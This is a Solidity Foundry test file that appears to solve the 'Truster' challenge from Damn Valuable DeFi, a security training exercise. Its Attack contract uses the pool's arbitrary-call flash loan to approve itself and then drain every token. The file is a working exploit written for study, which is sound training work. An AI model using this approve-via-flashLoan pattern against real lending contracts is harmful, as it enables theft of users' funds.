// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/TrusterLenderPool.sol";
import "../src/DamnValuableToken.sol";

contract ProofsOfConcept is Test {
    address attacker = makeAddr("attacker");

    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;

    TrusterLenderPool lenderPool;
    DamnValuableToken valuableToken;

    constructor() {
        valuableToken = new DamnValuableToken();
        lenderPool = new TrusterLenderPool(address(valuableToken));

        deal(
            address(valuableToken),
            address(lenderPool),
            FLASH_LOAN_POOL_AMOUNT
        );
    }

    function testHappyPath() external {
        LoanUser loanUser = new LoanUser(valuableToken, lenderPool);
        loanUser.act();
    }

    function testAttack() external {
        assertEq(valuableToken.balanceOf(attacker), 0);
        assertEq(
            valuableToken.balanceOf(address(lenderPool)),
            FLASH_LOAN_POOL_AMOUNT
        );

        vm.startPrank(attacker);
        Attack attack = new Attack(lenderPool, valuableToken);
        attack.attack(FLASH_LOAN_POOL_AMOUNT);

        assertEq(valuableToken.balanceOf(attacker), FLASH_LOAN_POOL_AMOUNT);
        assertEq(valuableToken.balanceOf(address(lenderPool)), 0);
    }
}

contract LoanUser {
    DamnValuableToken token;
    TrusterLenderPool lenderPool;

    constructor(DamnValuableToken _token, TrusterLenderPool _lenderPool) {
        token = _token;
        lenderPool = _lenderPool;
    }

    function act() external {
        lenderPool.flashLoan(
            100,
            address(this),
            address(this),
            abi.encodeWithSignature("receiveFlashLoan(uint256)", 100)
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Received flash loan: %d", amount);
        console.log("Current balance: %d", token.balanceOf(address(this)));

        console.log("Approving lenderPool to transfer %d", amount);
        token.transfer(address(lenderPool), amount);
        console.log("Current balance: %d", token.balanceOf(address(this)));
    }
}

contract Attack {
    using Address for address payable;

    TrusterLenderPool lenderPool;
    DamnValuableToken valuableToken;
    address owner;

    constructor(
        TrusterLenderPool _rewarderPool,
        DamnValuableToken _damnValuableToken
    ) {
        lenderPool = _rewarderPool;
        valuableToken = _damnValuableToken;
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "Only owner can call");

        lenderPool.flashLoan(
            0,
            address(this),
            address(valuableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)", //@audit-info no spaces between args
                address(this), // @audit-info `spender` must be `address(this)` since it runs the `transferFrom` call
                amount
            )
        );

        valuableToken.transferFrom(address(lenderPool), owner, amount);
    }
}
